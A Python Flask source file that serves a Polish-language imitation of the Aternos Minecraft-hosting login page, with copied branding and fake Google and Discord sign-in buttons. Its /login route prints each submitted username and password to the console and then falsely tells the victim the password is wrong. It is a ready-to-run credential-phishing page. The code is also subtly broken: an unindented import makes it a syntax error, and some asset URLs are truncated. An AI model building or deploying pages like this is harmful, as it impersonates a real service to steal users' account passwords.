
from flask import Flask, request, render_template_string

app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel Logowania - Aternos Style</title>
    <style>
        @import url('https://googleapis.com');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            background: #0b0b1a;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: #fff;
            padding: 20px;
        }

        .brand-container {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 24px;
            user-select: none;
        }

        .brand-logo {
            width: 42px;
            height: 42px;
        }

        .brand-text {
            font-size: 32px;
            font-weight: 800;
            letter-spacing: 0.5px;
            background: linear-gradient(135deg, #4fc3f7, #29b6f6);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .login-card {
            background: rgba(20, 20, 50, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 16px;
            padding: 40px;
            width: 100%;
            max-width: 400px;
            backdrop-filter: blur(20px);
            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.5);
        }
        
        .login-header {
            text-align: center;
            margin-bottom: 24px;
        }
        
        .login-header h1 {
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 6px;
            color: #fff;
        }
        
        .login-header p {
            color: rgba(255, 255, 255, 0.5);
            font-size: 14px;
        }

        .social-buttons {
            display: flex;
            flex-direction: column;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        /* Zmiana układu na rządek (row), aby ikona i tekst były obok siebie */
        .social-btn {
            display: flex;
            flex-direction: row; 
            align-items: center;
            justify-content: center;
            gap: 12px; /* Odstęp między ikoną a tekstem */
            padding: 12px 16px;
            border-radius: 10px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            background: rgba(255, 255, 255, 0.04);
            color: #fff;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            width: 100%;
        }
        
        .social-btn:hover {
            background: rgba(255, 255, 255, 0.08);
            border-color: rgba(255, 255, 255, 0.2);
            transform: translateY(-1px);
        }

        /* Dokładne wymiary dla ikon */
        .social-btn img {
            width: 20px;
            height: 20px;
            object-fit: contain;
        }
        
        .divider {
            display: flex;
            align-items: center;
            gap: 16px;
            margin-bottom: 20px;
            color: rgba(255, 255, 255, 0.3);
            font-size: 13px;
        }
        
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: rgba(255, 255, 255, 0.08);
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: rgba(255, 255, 255, 0.7);
            margin-bottom: 8px;
        }
        
        .form-group input {
            width: 100%;
            padding: 12px 14px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            color: #fff;
            font-size: 15px;
            outline: none;
            transition: all 0.2s;
        }
        
        .form-group input:focus {
            border-color: #4fc3f7;
            background: rgba(255, 255, 255, 0.08);
            box-shadow: 0 0 0 3px rgba(79, 195, 247, 0.15);
        }
        
        .login-btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #4fc3f7, #29b6f6);
            border: none;
            border-radius: 10px;
            color: #fff;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.2s;
            box-shadow: 0 4px 15px rgba(79, 195, 247, 0.3);
            margin-top: 10px;
        }
        
        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(79, 195, 247, 0.4);
        }
    </style>
</head>
<body>

    <div class="brand-container">
        <svg class="brand-logo" viewBox="0 0 64 64" fill="none" xmlns="http://w3.org">
            <rect x="2" y="2" width="60" height="60" rx="8" stroke="#29b6f6" stroke-width="4"/>
            <rect x="14" y="14" width="12" height="12" fill="#29b6f6"/>
            <rect x="38" y="14" width="12" height="12" fill="#29b6f6"/>
            <rect x="14" y="38" width="12" height="12" fill="#29b6f6"/>
            <rect x="38" y="38" width="12" height="12" fill="#29b6f6"/>
            <rect x="26" y="26" width="12" height="12" fill="#fff"/>
        </svg>
        <div class="brand-text">ATERNOS</div>
    </div>

    <div class="login-card">
        <div class="login-header">
            <h1>Zaloguj się</h1>
            <p>Aby zarządzać swoim serwerem Minecraft</p>
        </div>

        <div class="social-buttons">
            <button class="social-btn" onclick="alert('Przekierowanie do logowania Google...')">
                <img src="https://gstatic.com" alt="Google">
                Zaloguj przez Google
            </button>
            <button class="social-btn" onclick="alert('Przekierowanie do logowania Discord...')">
                <img src="https://website-files.com" alt="Discord">
                Zaloguj przez Discord
            </button>
        </div>

        <div class="divider">lub użyj konta Aternos</div>
        
        <form action="/login" method="POST">
            <div class="form-group">
                <label>NAZWA UŻYTKOWNIKA / EMAIL</label>
                <input type="text" name="username" placeholder="Nazwa użytkownika lub email..." required>
            </div>
            
            <div class="form-group">
                <label>HASŁO</label>
                <input type="password" name="password" placeholder="Wpisz swoje hasło..." required>
            </div>
            
            <button type="submit" class="login-btn">Zaloguj się</button>
        </form>
    </div>

</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    if username and password:
        print("\n[SERWER] Odebrano dane logowania:")
        print(f" -> Uzytkownik: {username}")
        print(f" -> Haslo: {password}\n")
        return "Hasło niepoprawne. Spróboj jeszcze raz."
    
    return "Blad: Brak danych.", 400

if __name__ == '__main__':
import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)